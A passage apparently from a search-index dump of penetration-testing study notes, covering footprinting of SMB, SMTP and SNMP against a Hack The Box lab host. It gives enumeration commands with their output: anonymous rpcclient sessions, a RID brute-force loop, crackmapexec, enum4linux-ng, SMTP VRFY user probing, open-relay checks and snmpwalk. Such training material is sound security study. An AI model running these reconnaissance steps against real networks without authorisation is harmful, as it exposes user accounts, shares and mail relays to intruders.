-p139,445 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST Nmap scan report for sharing.inlanefreight.htb (10.129.14.128) Host is up (0.00024s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 MAC Address: 00:00:00:00:00:00 (VMware) Host script results: |_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-09-19T13:16:04 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds RPCclient hrmns@htb[/htb]$ rpcclient -U \"\" 10 .129.14.128 Enter WORKGROUP\\'s password: rpcclient $> RPCclient - Enumeration rpcclient $> srvinfo DEVSMB Wk Sv PrQ Unx NT SNT DEVSM platform_id : 500 os version : 6.1 server type : 0x809a03 rpcclient $> enumdomains name:[DEVSMB] idx:[0x0] name:[Builtin] idx:[0x1] rpcclient $> querydominfo Domain: DEVOPS Server: DEVSMB Comment: DEVSM Total Users: 2 Total Groups: 0 Total Aliases: 0 Sequence No: 1632361158 Force Logoff: -1 Domain Server State: 0x1 Server Role: ROLE_DOMAIN_PDC Unknown 3: 0x1 rpcclient $> netshareenumall netname: print$ remark: Printer Drivers path: C:\\var\\lib\\samba\\printers password: netname: home remark: INFREIGHT Samba path: C:\\home\\ password: netname: dev remark: DEVenv path: C:\\home\\sambauser\\dev\\ password: netname: notes remark: CheckIT path: C:\\mnt\\notes\\ password: netname: IPC$ remark: IPC Service (DEVSM) path: C:\\tmp password: rpcclient $> netsharegetinfo notes netname: notes remark: CheckIT path: C:\\mnt\\notes\\ password: type: 0x0 perms: 0 max_uses: -1 num_uses: 1 revision: 1 type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE DACL ACL Num ACEs: 1 revision: 2 --- ACE type: ACCESS ALLOWED (0) flags: 0x00 Specific bits: 0x1ff Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS SID: S-1-1-0 These examples show us what information can be leaked to anonymous users. Once an anonymous user has access to a network service, it only takes one mistake to give them too many permissions or too much visibility to put the entire network at significant risk. Rpcclient - User Enumeration rpcclient $> enumdomusers user:[mrb3n] rid:[0x3e8] user:[cry0l1t3] rid:[0x3e9] rpcclient $> queryuser 0x3e9 User Name : cry0l1t3 Full Name : cry0l1t3 Home Drive : \\\\devsmb\\cry0l1t3 Dir Drive : Profile Path: \\\\devsmb\\cry0l1t3\\profile Logon Script: Description : Workstations: Comment : Remote Dial : Logon Time : Do, 01 Jan 1970 01:00:00 CET Logoff Time : Mi, 06 Feb 2036 16:06:39 CET Kickoff Time : Mi, 06 Feb 2036 16:06:39 CET Password last set Time : Mi, 22 Sep 2021 17:50:56 CEST Password can change Time : Mi, 22 Sep 2021 17:50:56 CEST Password must change Time: Do, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x3e9 group_rid: 0x201 acb_info : 0x00000014 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... rpcclient $> queryuser 0x3e8 User Name : mrb3n Full Name : Home Drive : \\\\devsmb\\mrb3n Dir Drive : Profile Path: \\\\devsmb\\mrb3n\\profile Logon Script: Description : Workstations: Comment : Remote Dial : Logon Time : Do, 01 Jan 1970 01:00:00 CET Logoff Time : Mi, 06 Feb 2036 16:06:39 CET Kickoff Time : Mi, 06 Feb 2036 16:06:39 CET Password last set Time : Mi, 22 Sep 2021 17:47:59 CEST Password can change Time : Mi, 22 Sep 2021 17:47:59 CEST Password must change Time: Do, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x3e8 group_rid: 0x201 acb_info : 0x00000010 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... Rpcclient - Group Information rpcclient $> querygroup 0x201 Group Name: None Description: Ordinary Users Group Attribute:7 Num Members:2 Brute Forcing User RIDs hrmns@htb [ /htb ] $ for i in $( seq 500 1100 ) ; do rpcclient -N -U \"\" 10 .129.14.128 -c \"queryuser 0x $( printf '%x\\n' $i ) \" | grep \"User Name\\|user_rid\\|group_rid\" && echo \"\" ; done User Name : sambauser user_rid : 0x1f5 group_rid: 0x201 User Name : mrb3n user_rid : 0x3e8 group_rid: 0x201 User Name : cry0l1t3 user_rid : 0x3e9 group_rid: 0x201 Alternative: Python script from Impacket called samrdump.py hrmns@htb[/htb]$ samrdump.py 10 .129.14.128 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Retrieving endpoint list from 10.129.14.128 Found domain(s): . DEVSMB . Builtin [*] Looking up users in domain DEVSMB Found user: mrb3n, uid = 1000 Found user: cry0l1t3, uid = 1001 mrb3n (1000)/FullName: mrb3n (1000)/UserComment: mrb3n (1000)/PrimaryGroupId: 513 mrb3n (1000)/BadPasswordCount: 0 mrb3n (1000)/LogonCount: 0 mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59 mrb3n (1000)/PasswordDoesNotExpire: False mrb3n (1000)/AccountIsDisabled: False mrb3n (1000)/ScriptPath: cry0l1t3 (1001)/FullName: cry0l1t3 cry0l1t3 (1001)/UserComment: cry0l1t3 (1001)/PrimaryGroupId: 513 cry0l1t3 (1001)/BadPasswordCount: 0 cry0l1t3 (1001)/LogonCount: 0 cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56 cry0l1t3 (1001)/PasswordDoesNotExpire: False cry0l1t3 (1001)/AccountIsDisabled: False cry0l1t3 (1001)/ScriptPath: [*] Received 2 entries. The information we have already obtained with rpcclient can also be obtained using other tools. For example, the SMBMap and CrackMapExec tools are also widely used and helpful for the enumeration of SMB services. SMBmap hrmns@htb[/htb]$ smbmap -H 10 .129.14.128 [+] Finding open SMB ports.... [+] User SMB session established on 10.129.14.128... [+] IP: 10.129.14.128:445 Name: 10.129.14.128 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers home NO ACCESS INFREIGHT Samba dev NO ACCESS DEVenv notes NO ACCESS CheckIT IPC$ NO ACCESS IPC Service (DEVSM) CrackMapExec hrmns@htb[/htb]$ crackmapexec smb 10 .129.14.128 --shares -u '' -p '' SMB 10.129.14.128 445 DEVSMB [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False) SMB 10.129.14.128 445 DEVSMB [+] \\: SMB 10.129.14.128 445 DEVSMB [+] Enumerated shares SMB 10.129.14.128 445 DEVSMB Share Permissions Remark SMB 10.129.14.128 445 DEVSMB ----- ----------- ------ SMB 10.129.14.128 445 DEVSMB print$ Printer Drivers SMB 10.129.14.128 445 DEVSMB home INFREIGHT Samba SMB 10.129.14.128 445 DEVSMB dev DEVenv SMB 10.129.14.128 445 DEVSMB notes READ,WRITE CheckIT SMB 10.129.14.128 445 DEVSMB IPC$ IPC Service (DEVSM) enum4linux-ng , which is based on an older tool, enum4linux. This tool automates many of the queries, but not all, and can return a large amount of information. Install hrmns@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git hrmns@htb[/htb]$ cd enum4linux-ng hrmns@htb[/htb]$ pip3 install -r requirements.txt Enumeration hrmns@htb[/htb]$ ./enum4linux-ng.py 10 .129.14.128 -A ENUM4LINUX - next generation ========================== | Target Information | ========================== [*] Target ........... 10.129.14.128 [*] Username ......... '' [*] Random Username .. 'juzgtcsu' [*] Password ......... '' [*] Timeout .......... 5 second(s) ===================================== | Service Scan on 10.129.14.128 | ===================================== [*] Checking LDAP [-] Could not connect to LDAP on 389/tcp: connection refused [*] Checking LDAPS [-] Could not connect to LDAPS on 636/tcp: connection refused [*] Checking SMB [+] SMB is accessible on 445/tcp [*] Checking SMB over NetBIOS [+] SMB over NetBIOS is accessible on 139/tcp ===================================================== | NetBIOS Names and Workgroup for 10.129.14.128 | ===================================================== [+] Got domain/workgroup name: DEVOPS [+] Full NetBIOS names information: - DEVSMB <00> - H <ACTIVE> Workstation Service - DEVSMB <03> - H <ACTIVE> Messenger Service - DEVSMB <20> - H <ACTIVE> File Server Service - ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE> Master Browser - DEVOPS <00> - <GROUP> H <ACTIVE> Domain/Workgroup Name - DEVOPS <1d> - H <ACTIVE> Master Browser - DEVOPS <1e> - <GROUP> H <ACTIVE> Browser Service Elections - MAC Address = 00-00-00-00-00-00 ========================================== | SMB Dialect Check on 10.129.14.128 | ========================================== [*] Trying on 445/tcp [+] Supported dialects and settings: SMB 1.0: false SMB 2.02: true SMB 2.1: true SMB 3.0: true SMB1 only: false Preferred dialect: SMB 3.0 SMB signing required: false ========================================== | RPC Session Check on 10.129.14.128 | ========================================== [*] Check for null session [+] Server allows session using username '', password '' [*] Check for random user session [+] Server allows session using username 'juzgtcsu', password '' [H] Rerunning enumeration with user 'juzgtcsu' might give more results ==================================================== | Domain Information via RPC for 10.129.14.128 | ==================================================== [+] Domain: DEVOPS [+] SID: NULL SID [+] Host is part of a workgroup (not a domain) ============================================================ | Domain Information via SMB session for 10.129.14.128 | ============================================================ [*] Enumerating via unauthenticated SMB session on 445/tcp [+] Found domain information via SMB NetBIOS computer name: DEVSMB NetBIOS domain name: '' DNS domain: '' FQDN: htb ================================================ | OS Information via RPC for 10.129.14.128 | ================================================ [*] Enumerating via unauthenticated SMB session on 445/tcp [+] Found OS information via SMB [*] Enumerating via 'srvinfo' [+] Found OS information via 'srvinfo' [+] After merging OS information we have the following result: OS: Windows 7, Windows Server 2008 R2 OS version: '6.1' OS release: '' OS build: '0' Native OS: not supported Native LAN manager: not supported Platform id: '500' Server type: '0x809a03' Server type string: Wk Sv PrQ Unx NT SNT DEVSM ====================================== | Users via RPC on 10.129.14.128 | ====================================== [*] Enumerating users via 'querydispinfo' [+] Found 2 users via 'querydispinfo' [*] Enumerating users via 'enumdomusers' [+] Found 2 users via 'enumdomusers' [+] After merging user results we have 2 users total: '1000': username: mrb3n name: '' acb: '0x00000010' description: '' '1001': username: cry0l1t3 name: cry0l1t3 acb: '0x00000014' description: '' ======================================= | Groups via RPC on 10.129.14.128 | ======================================= [*] Enumerating local groups [+] Found 0 group(s) via 'enumalsgroups domain' [*] Enumerating builtin groups [+] Found 0 group(s) via 'enumalsgroups builtin' [*] Enumerating domain groups [+] Found 0 group(s) via 'enumdomgroups' ======================================= | Shares via RPC on 10.129.14.128 | ======================================= [*] Enumerating shares [+] Found 5 share(s): IPC$: comment: IPC Service (DEVSM) type: IPC dev: comment: DEVenv type: Disk home: comment: INFREIGHT Samba type: Disk notes: comment: CheckIT type: Disk print$: comment: Printer Drivers type: Disk [*] Testing share IPC$ [-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND [*] Testing share dev [-] Share doesn't exist [*] Testing share home [+] Mapping: OK, Listing: OK [*] Testing share notes [+] Mapping: OK, Listing: OK [*] Testing share print$ [+] Mapping: DENIED, Listing: N/A ========================================== | Policies via RPC for 10.129.14.128 | ========================================== [*] Trying port 445/tcp [+] Found policy: domain_password_information: pw_history_length: None min_pw_length: 5 min_pw_age: none max_pw_age: 49710 days 6 hours 21 minutes pw_properties: - DOMAIN_PASSWORD_COMPLEX: false - DOMAIN_PASSWORD_NO_ANON_CHANGE: false - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false domain_lockout_information: lockout_observation_window: 30 minutes lockout_duration: 30 minutes lockout_threshold: None domain_logoff_information: force_logoff_time: 49710 days 6 hours 21 minutes ========================================== | Printers via RPC for 10.129.14.128 | ========================================== [+] No printers returned (this is not an error) Completed after 0.61 seconds Use more than two tools for enumeration. Because it can happen that due to the programming of the tools, we get different information that we have to check manually. Therefore, we should never rely only on automated tools where we do not know precisely how they were written.","title":"Footprinting the Service"},{"location":"footprinting/smtp/","text":"After sending his e-mail, the SMTP client, also known as Mail User Agent ( MUA ), converts it into a header and a body and uploads both to the SMTP server. This has a so-called Mail Transfer Agent ( MTA ), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a Mail Submission Agent ( MSA ), which checks the validity, i.e., the origin of the e-mail. This MSA is also called Relay server. The MTA then searches the DNS for the IP address of the recipient mail server. On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the Mail delivery agent ( MDA ) transfers it to the recipient's mailbox. Client ( MUA ) \u279e Submission Agent ( MSA ) \u279e Open Relay ( MTA ) \u279e Mail Delivery Agent ( MDA ) \u279e Mailbox ( POP3 / IMAP ) Default Config \u00b6 hrmns@htb[/htb]$ cat /etc/postfix/main.cf | grep -v \"#\" | sed -r \"/^\\s* $ /d\" smtpd_banner = ESMTP Server biff = no append_dot_mydomain = no readme_directory = no compatibility_level = 2 smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache myhostname = mail1.inlanefreight.htb alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases smtp_generic_maps = hash:/etc/postfix/generic mydestination = $myhostname, localhost masquerade_domains = $myhostname mynetworks = 127.0.0.0/8 10.129.0.0/16 mailbox_size_limit = 0 recipient_delimiter = + smtp_bind_address = 0.0.0.0 inet_protocols = ipv4 smtpd_helo_restrictions = reject_invalid_hostname home_mailbox = /home/postfix To interact with the SMTP server, we can use the telnet tool to initialize a TCP connection with the SMTP server. hrmns@htb[/htb]$ telnet 10 .129.14.128 25 Trying 10.129.14.128... Connected to 10.129.14.128. Escape character is '^]'. 220 ESMTP Server HELO mail1.inlanefreight.htb 250 mail1.inlanefreight.htb EHLO mail1 250-mail1.inlanefreight.htb 250-PIPELINING 250-SIZE 10240000 250-ETRN 250-ENHANCEDSTATUSCODES 250-8BITMIME 250-DSN 250-SMTPUTF8 250 CHUNKING VRFY can be used to enumerate existing users on the system. hrmns@htb[/htb]$ telnet 10 .129.14.128 25 Trying 10.129.14.128... Connected to 10.129.14.128. Escape character is '^]'. 220 ESMTP Server VRFY root 252 2.0.0 root VRFY cry0l1t3 252 2.0.0 cry0l1t3 VRFY testuser 252 2.0.0 testuser VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa 252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa Dangerous Settings \u00b6 Allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers. Open Relay Configuration mynetworks = 0.0.0.0/0 With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it. Footprinting the Service \u00b6 hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sC -sV -p25 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST Nmap scan report for 10.129.14.128 Host is up (0.00025s latency). PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd |_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests. hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -p25 --script smtp-open-relay -v Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 02:29 CEST NSE: Loaded 1 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 02:29 Completed NSE at 02:29, 0.00s elapsed Initiating ARP Ping Scan at 02:29 Scanning 10.129.14.128 [1 port] Completed ARP Ping Scan at 02:29, 0.06s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 02:29 Completed Parallel DNS resolution of 1 host. at 02:29, 0.03s elapsed Initiating SYN Stealth Scan at 02:29 Scanning 10.129.14.128 [1 port] Discovered open port 25/tcp on 10.129.14.128 Completed SYN Stealth Scan at 02:29, 0.06s elapsed (1 total ports) NSE: Script scanning 10.129.14.128. Initiating NSE at 02:29 Completed NSE at 02:29, 0.07s elapsed Nmap scan report for 10.129.14.128 Host is up (0.00020s latency). PORT STATE SERVICE 25/tcp open smtp | smtp-open-relay: Server is an open relay (16/16 tests) | MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@ESMTP> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.129.14.128]> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@ESMTP> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest@nmap.scanme.org\"> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest%nmap.scanme.org\"> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@[10.129.14.128]> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest@nmap.scanme.org\"@[10.129.14.128]> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@ESMTP> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@[10.129.14.128]:relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@ESMTP:relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.129.14.128]> |_ MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@ESMTP> MAC Address: 00:00:00:00:00:00 (VMware) NSE: Script Post-scanning. Initiating NSE at 02:29 Completed NSE at 02:29, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds Raw packets sent: 2 (72B) | Rcvd: 2 (72B)","title":"SMTP"},{"location":"footprinting/smtp/#default-config","text":"hrmns@htb[/htb]$ cat /etc/postfix/main.cf | grep -v \"#\" | sed -r \"/^\\s* $ /d\" smtpd_banner = ESMTP Server biff = no append_dot_mydomain = no readme_directory = no compatibility_level = 2 smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache myhostname = mail1.inlanefreight.htb alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases smtp_generic_maps = hash:/etc/postfix/generic mydestination = $myhostname, localhost masquerade_domains = $myhostname mynetworks = 127.0.0.0/8 10.129.0.0/16 mailbox_size_limit = 0 recipient_delimiter = + smtp_bind_address = 0.0.0.0 inet_protocols = ipv4 smtpd_helo_restrictions = reject_invalid_hostname home_mailbox = /home/postfix To interact with the SMTP server, we can use the telnet tool to initialize a TCP connection with the SMTP server. hrmns@htb[/htb]$ telnet 10 .129.14.128 25 Trying 10.129.14.128... Connected to 10.129.14.128. Escape character is '^]'. 220 ESMTP Server HELO mail1.inlanefreight.htb 250 mail1.inlanefreight.htb EHLO mail1 250-mail1.inlanefreight.htb 250-PIPELINING 250-SIZE 10240000 250-ETRN 250-ENHANCEDSTATUSCODES 250-8BITMIME 250-DSN 250-SMTPUTF8 250 CHUNKING VRFY can be used to enumerate existing users on the system. hrmns@htb[/htb]$ telnet 10 .129.14.128 25 Trying 10.129.14.128... Connected to 10.129.14.128. Escape character is '^]'. 220 ESMTP Server VRFY root 252 2.0.0 root VRFY cry0l1t3 252 2.0.0 cry0l1t3 VRFY testuser 252 2.0.0 testuser VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa 252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa","title":"Default Config"},{"location":"footprinting/smtp/#dangerous-settings","text":"Allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers. Open Relay Configuration mynetworks = 0.0.0.0/0 With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.","title":"Dangerous Settings"},{"location":"footprinting/smtp/#footprinting-the-service","text":"hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sC -sV -p25 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST Nmap scan report for 10.129.14.128 Host is up (0.00025s latency). PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd |_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests. hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -p25 --script smtp-open-relay -v Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 02:29 CEST NSE: Loaded 1 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 02:29 Completed NSE at 02:29, 0.00s elapsed Initiating ARP Ping Scan at 02:29 Scanning 10.129.14.128 [1 port] Completed ARP Ping Scan at 02:29, 0.06s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 02:29 Completed Parallel DNS resolution of 1 host. at 02:29, 0.03s elapsed Initiating SYN Stealth Scan at 02:29 Scanning 10.129.14.128 [1 port] Discovered open port 25/tcp on 10.129.14.128 Completed SYN Stealth Scan at 02:29, 0.06s elapsed (1 total ports) NSE: Script scanning 10.129.14.128. Initiating NSE at 02:29 Completed NSE at 02:29, 0.07s elapsed Nmap scan report for 10.129.14.128 Host is up (0.00020s latency). PORT STATE SERVICE 25/tcp open smtp | smtp-open-relay: Server is an open relay (16/16 tests) | MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@ESMTP> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.129.14.128]> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@ESMTP> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest@nmap.scanme.org\"> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest%nmap.scanme.org\"> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@[10.129.14.128]> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest@nmap.scanme.org\"@[10.129.14.128]> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@ESMTP> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@[10.129.14.128]:relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@ESMTP:relaytest@nmap.scanme.org> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest> | MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.129.14.128]> |_ MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@ESMTP> MAC Address: 00:00:00:00:00:00 (VMware) NSE: Script Post-scanning. Initiating NSE at 02:29 Completed NSE at 02:29, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds Raw packets sent: 2 (72B) | Rcvd: 2 (72B)","title":"Footprinting the Service"},{"location":"footprinting/snmp/","text":"Simple Network Management Protocol SNMP was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port 161 . The client can set specific values in the device and change options and settings with these commands. SNMP also enables the use of so-called traps over UDP port 162 . These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side. MIB To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. OID An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. SNMPv3 The security has been increased enormously for SNMPv3 by security features such as username and password and transmission encryption (via pre-shared key ) of the data. Community Strings Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active. Default Configuration \u00b6 hrmns@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v \"#\" | sed -r '/^\\s*$/d' sysLocation Sitting on the Dock of the Bay sysContact Me <me@example.org> sysServices 72 master agentx agentaddress 127.0.0.1,[::1] view systemonly included .1.3.6.1.2.1.1 view systemonly included .1.3.6.1.2.1.25.1 rocommunity public default -V systemonly rocommunity6 public default -V systemonly rouser authPrivUser authpriv -V systemonly Dangerous Settings \u00b6 Settings Description rwuser noauth Provides access to the full OID tree without authentication. rwcommunity <community string> <IPv4 address> Provides access to the full OID tree regardless of where the requests were sent from. rwcommunity6 <community string> <IPv6 address> Same access as with rwcommunity with the difference of using IPv6. Footprinting the Service \u00b6 We can use tools like snmpwalk , onesixtyone , and braa . Snmpwalk is used to query the OIDs with their information. Onesixtyone can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. SNMPwalk hrmns@htb[/htb]$ snmpwalk -v2c -c public 10 .129.14.128 iso.3.6.1.2.1.1.1.0 = STRING: \"Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\" iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 iso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34 iso.3.6.1.2.1.1.4.0 = STRING: \"mrb3n@inlanefreight.htb\" iso.3.6.1.2.1.1.5.0 = STRING: \"htb\" iso.3.6.1.2.1.1.6.0 = STRING: \"Sitting on the Dock of the Bay\" iso.3.6.1.2.1.1.7.0 = INTEGER: 72 iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1 iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1 iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1 iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1 iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1 iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49 iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4 iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50 iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3 iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92 iso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The SNMP Management Architecture MIB.\" iso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The MIB for Message Processing and Dispatching.\" iso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The management information definitions for the SNMP User-based Security Model.\" iso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\" iso.3.6.1.2.1.1.9.1.3.5 = STRING: \"View-based Access Control Model for SNMP.\" iso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing TCP implementations\" iso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing IP and ICMP implementations\" iso.3.6.1.2.1.1.9.1.3.8 = STRING: \"The MIB module for managing UDP implementations\" iso.3.6.1.2.1.1.9.1.3.9 = STRING: \"The MIB modules for managing SNMP Notification, plus filtering.\" iso.3.6.1.2.1.1.9.1.3.10 = STRING: \"The MIB module for logging SNMP Notifications.\" iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00 